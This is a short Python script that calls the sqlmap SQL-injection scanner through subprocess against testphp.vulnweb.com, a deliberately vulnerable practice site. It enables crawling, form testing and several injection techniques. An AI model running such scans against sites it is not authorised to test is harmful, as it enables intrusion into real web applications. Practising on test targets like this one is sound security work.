#!/usr/bin/env python3
import subprocess

def run_sqlmap():
    # Build the sqlmap command with the necessary options.
    cmd = [
        "sqlmap",
        "-u", "http://testphp.vulnweb.com/listproducts.php?cat=1",
        "--batch",
        "--level=1",
        "--risk=1",
        "--random-agent",
        "--threads=10",
        "--technique=BEUST",
        "--forms",
        "--crawl=2"
    ]

    try:
        # Execute the command and capture output.
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print("SQLmap Output:\n", result.stdout)
        if result.stderr:
            print("SQLmap Errors:\n", result.stderr)
    except subprocess.CalledProcessError as e:
        # Handle errors in execution.
        print("An error occurred while running sqlmap:")
        print("Return code:", e.returncode)
        print("Output:", e.output)
        print("Error Output:", e.stderr)

# if __name__ == "__main__":
print(run_sqlmap())
